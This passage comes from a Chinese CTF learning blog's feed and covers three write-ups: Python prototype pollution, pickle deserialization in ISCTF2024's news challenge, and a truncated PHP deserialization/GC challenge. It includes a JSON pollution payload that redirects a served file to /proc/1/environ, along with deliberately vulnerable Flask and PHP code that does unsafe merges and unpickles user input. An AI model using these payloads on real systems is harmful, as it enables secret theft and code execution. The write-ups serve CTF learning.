class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment">#遍历 src，递归合并数据到 dst，支持字典合并和对象属性动态更新。</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment">#@app.route 是一个装饰器</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:<span class="comment">#检查请求中是否有数据</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#使用 try...except 捕获所有可能的异常，确保程序不会因为意外错误而崩溃</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):<span class="comment">#假定是一个自定义的函数，用于验证请求数据的合法性</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)<span class="comment">#将请求中的原始数据（字节流）解析为 Python 字典,如果解析失败,返回 &quot;Register Failed&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)<span class="comment">#将 data 中的键值对合并到用户实例 User 中</span></span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure><p>看到merge函数基本想到的就是python原型链污染</p><p>利用merge来动态污染原型链的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;:&quot;111&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;222&quot;,</span><br><span class="line">    &quot;__class__&quot;:&#123;</span><br><span class="line">        &quot;check&quot;:&#123;</span><br><span class="line">            &quot;__globals__&quot;:&#123;</span><br><span class="line">                &quot;__file__&quot; : &quot;/proc/1/environ&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后直接get &#x2F;就好</p><p>象征性的复现一下(●’◡’●)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;leran from :&lt;a href=&quot;https://pazuris.cn/2023/07/27/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&quot;&gt;https://pazuris.cn/2023/07/27/Py</summary>
      
    
    
    
    <category term="pollute" scheme="https://gu0f3n.github.io/categories/pollute/"/>
    
    
    <category term="python" scheme="https://gu0f3n.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Pickle反序列化</title>
    <link href="https://gu0f3n.github.io/2024/11/19/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://gu0f3n.github.io/2024/11/19/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-11-19T03:10:44.000Z</published>
    <updated>2024-11-19T04:53:02.333Z</updated>
    
    <content type="html"><![CDATA[<p>Learnd From: <a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></p><h3 id="什么是Pickle？"><a href="#什么是Pickle？" class="headerlink" title="什么是Pickle？"></a>什么是Pickle？</h3><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">pickle是Python中一个能够序列化和反序列化对象的模块。和其他语言类似，Python也提供了序列化和反序列化这一功能，其中一个实现模块就是pickle。在Python中，*“Pickling”* 是将 Python 对象及其所拥有的层次结构转化为一个**二进制字节流**的过程，也就是我们常说的序列化，而 *“unpickling”* 是相反的操作，会将字节流转化回一个对象层次结构。</span><br><span class="line"></span><br><span class="line">当然在Python 中并不止pickle一个模块能够进行这一操作，更原始的序列化模块如`marshal`，同样能够完成序列化的任务，不过两者的侧重点并不相同，`marshal`存在主要是为了支持 Python 的`.pyc`文件。现在开发时一般首选pickle。</span><br><span class="line"></span><br><span class="line">pickle实际上可以看作一种**独立的语言**，通过对`opcode`的编写可以进行Python代码执行、覆盖变量等操作。直接编写的`opcode`灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</span><br><span class="line"></span><br><span class="line">既然opcode能够执行Python代码，那自然就免不了安全问题。以下是Python在pickle文档中的警告。</span><br></pre></td></tr></table></figure><h3 id="常用opcode"><a href="#常用opcode" class="headerlink" title="常用opcode"></a>常用opcode</h3><p>在Python的pickle.py中，我们能够找到所有的opcode及其解释，常用的opcode如下，这里我们以V0版本为例</p><table><thead><tr><th align="left">指令</th><th align="left">描述</th><th align="left">具体写法</th><th align="left">栈上的变化</th></tr></thead><tbody><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><table><thead><tr><th align="left"></th><th align="left"></th><th align="left"></th><th align="center"></th></tr></thead><tbody><tr><td align="left">c</td><td align="left">获取一个全局对象或import一个模块</td><td align="left">c[module]\n[instance]\n</td><td align="center">获得的对象入栈</td></tr><tr><td align="left">o</td><td align="left">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td align="left">o</td><td align="center">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td></tr><tr><td align="left">i</td><td align="left">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td align="left">i[module]\n[callable]\n</td><td align="center">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td></tr><tr><td align="left">N</td><td align="left">实例化一个None</td><td align="left">N</td><td align="center">获得的对象入栈</td></tr><tr><td align="left">S</td><td align="left">实例化一个字符串对象</td><td align="left">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td align="center">获得的对象入栈</td></tr><tr><td align="left">V</td><td align="left">实例化一个UNICODE字符串对象</td><td align="left">Vxxx\n</td><td align="center">获得的对象入栈</td></tr><tr><td align="left">I</td><td align="left">实例化一个int对象</td><td align="left">Ixxx\n</td><td align="center">获得的对象入栈</td></tr><tr><td align="left">F</td><td align="left">实例化一个float对象</td><td align="left">Fx.x\n</td><td align="center">获得的对象入栈</td></tr><tr><td align="left">R</td><td align="left">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td align="left">R</td><td align="center">函数和参数出栈，函数的返回值入栈</td></tr><tr><td align="left">.</td><td align="left">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td align="left">.</td><td align="center">无</td></tr><tr><td align="left">(</td><td align="left">向栈中压入一个MARK标记</td><td align="left">(</td><td align="center">MARK标记入栈</td></tr><tr><td align="left">t</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为元组</td><td align="left">t</td><td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">)</td><td align="left">向栈中直接压入一个空元组</td><td align="left">)</td><td align="center">空元组入栈</td></tr><tr><td align="left">l</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为列表</td><td align="left">l</td><td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">]</td><td align="left">向栈中直接压入一个空列表</td><td align="left">]</td><td align="center">空列表入栈</td></tr><tr><td align="left">d</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td align="left">d</td><td align="center">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">}</td><td align="left">向栈中直接压入一个空字典</td><td align="left">}</td><td align="center">空字典入栈</td></tr><tr><td align="left">p</td><td align="left">将栈顶对象储存至memo_n</td><td align="left">pn\n</td><td align="center">无</td></tr><tr><td align="left">g</td><td align="left">将memo_n的对象压栈</td><td align="left">gn\n</td><td align="center">对象被压栈</td></tr><tr><td align="left">0</td><td align="left">丢弃栈顶对象</td><td align="left">0</td><td align="center">栈顶对象被丢弃</td></tr><tr><td align="left">b</td><td align="left">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td align="left">b</td><td align="center">栈上第一个元素出栈</td></tr><tr><td align="left">s</td><td align="left">将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td align="left">s</td><td align="center">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td></tr><tr><td align="left">u</td><td align="left">寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td align="left">u</td><td align="center">MARK标记以及被组合的数据出栈，字典被更新</td></tr><tr><td align="left">a</td><td align="left">将栈的第一个元素append到第二个元素(列表)中</td><td align="left">a</td><td align="center">栈顶元素出栈，第二个元素（列表）被更新</td></tr><tr><td align="left">e</td><td align="left">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td align="left">e</td><td align="center">MARK标记以及被组合的数据出栈，列表被更新</td></tr></tbody></table><h1 id="ISCTF2024【新闻系统】"><a href="#ISCTF2024【新闻系统】" class="headerlink" title="ISCTF2024【新闻系统】"></a>ISCTF2024【新闻系统】</h1><p>前面就是session 伪造不多说</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">源码：</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;W3l1com_isCTF&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">News</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, title, content</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.title = title</span><br><span class="line">        <span class="variable language_">self</span>.content = content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;news(name=<span class="subst">&#123;self.title&#125;</span>, words=<span class="subst">&#123;self.content&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NewsList</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.news_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_news</span>(<span class="params">self, title, content</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        news = News(title,content)</span><br><span class="line">        <span class="variable language_">self</span>.news_list.append(news)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">export_news</span>(<span class="params">self, news_title</span>) -&gt; <span class="built_in">str</span> | <span class="literal">None</span>:</span><br><span class="line">        news = <span class="variable language_">self</span>.get_news(news_title)</span><br><span class="line">        <span class="keyword">if</span> news <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="variable language_">self</span>.news_list.remove(news)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;删除成功&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_news</span>(<span class="params">self, serialized_news</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            news_data = base64.b64decode(serialized_news)</span><br><span class="line">            black_list = [<span class="string">&#x27;create_news&#x27;</span>,<span class="string">&#x27;export_news&#x27;</span>,<span class="string">&#x27;add_news&#x27;</span>,<span class="string">&#x27;get_news&#x27;</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">str</span>(news_data):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            news = pickle.loads(news_data) <span class="comment">#使用 pickle.loads 将解码后的数据反序列化成 Python 对象</span></span><br><span class="line">           </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(news,News):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable language_">self</span>.news_list:</span><br><span class="line">                    <span class="keyword">if</span> i.title == news.title:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="variable language_">self</span>.news_list.append(news)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_news</span>(<span class="params">self, news_title</span>) -&gt; News | <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> news <span class="keyword">in</span> <span class="variable language_">self</span>.news_list:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(news.title) == news_title:</span><br><span class="line">                <span class="keyword">return</span> news</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">newslist = NewsList()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;test&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;test111&#x27;</span>:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;password&#x27;</span>] = password</span><br><span class="line">            session[<span class="string">&#x27;status&#x27;</span>] = <span class="string">&#x27;user&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/news&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;login_error&#x27;</span>] = <span class="literal">True</span>               </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/news&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">news</span>():</span><br><span class="line">    news = newslist.news_list</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;news.html&quot;</span>,news = news)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    news = newslist.news_list</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;admin.html&quot;</span>,news = news)</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)   </span><br><span class="line">    title = request.form.get(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">    content = request.form.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">    newslist.create_news(title,content)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/export&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">export_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    news_title = request.form[<span class="string">&quot;title&quot;</span>]</span><br><span class="line">    result = newslist.export_news(news_title)</span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>: result&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;news not found&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/add&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_news</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;status&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> session.get(<span class="string">&#x27;password&#x27;</span>) != <span class="string">&#x27;admin222&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)    </span><br><span class="line">    serialized_news = request.form[<span class="string">&quot;serialized_news&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> newslist.add_news(serialized_news):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Failed to add news&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>伪造进入&#x2F;admin</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">news_data = base64.b64decode(serialized_news)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serialized_news = request.form[<span class="string">&quot;serialized_news&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> newslist.add_news(serialized_news):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/admin&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里可以看到add路由可以进行反序列化</p><p>参考了 <a href="https://xz.aliyun.com/t/16227?time__1311=GuD=PRxGrh8D/WNiQGkDuQrKj8DmE+bD#toc-7">https://xz.aliyun.com/t/16227?time__1311=GuD%3DPRxGrh8D%2FWNiQGkDuQrKj8DmE%2BbD#toc-7</a></p><p>自己暂时还不会构造 然后 可以得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Learnd From: &lt;a href=&quot;https://goodapple.top/archives/1069&quot;&gt;https://goodapple.top/archives/1069&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;什么是Pickle？&quot;&gt;&lt;a href=&quot;#什么是P</summary>
      
    
    
    
    <category term="unserialize" scheme="https://gu0f3n.github.io/categories/unserialize/"/>
    
    
    <category term="unserialize" scheme="https://gu0f3n.github.io/tags/unserialize/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化 + GC回收机制</title>
    <link href="https://gu0f3n.github.io/2024/11/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/"/>
    <id>https://gu0f3n.github.io/2024/11/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</id>
    <published>2024-11-16T04:53:24.000Z</published>
    <updated>2024-11-16T06:33:50.011Z</updated>
    
    <content type="html"><![CDATA[<p>f 复现的时候gc回收机制发现不会 写出来当笔记了</p><p>学习from：<a href="https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem=QaqiI3Y5p2GbD">https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem%3DQaqiI3Y5p2GbD</a></p><p>直接拿isctf的题目来进行练习</p><h2 id="天命人"><a href="#天命人" class="headerlink" title="天命人"></a>天命人</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">\<span class="comment"># 帮天命人搜集法宝，重获齐天之姿！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wuzhishan</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$wu</span>=<span class="string">&quot;俺老孙定要踏破这五指山！&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$zhi</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$shan</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$j</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;此地阴阳二气略显虚浮，加上刚刚带入的阳气，或可借此遁逃！&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$yin</span>=<span class="string">&quot;s214587387a&quot;</span>;</span><br><span class="line">    <span class="variable">$yang</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;J&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$yin</span>)==<span class="variable">$yang</span>&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$yin</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$yang</span>))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;哦？又一个不信天命之人？行了，拿了东西速速离开吧&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Huoyanjinjing</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$huoyan</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$jinjing</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$huo</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;huoyan=<span class="string">&quot;火眼能洞察一切邪祟！&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;huoyan-&gt;jinjing;</span><br><span class="line">  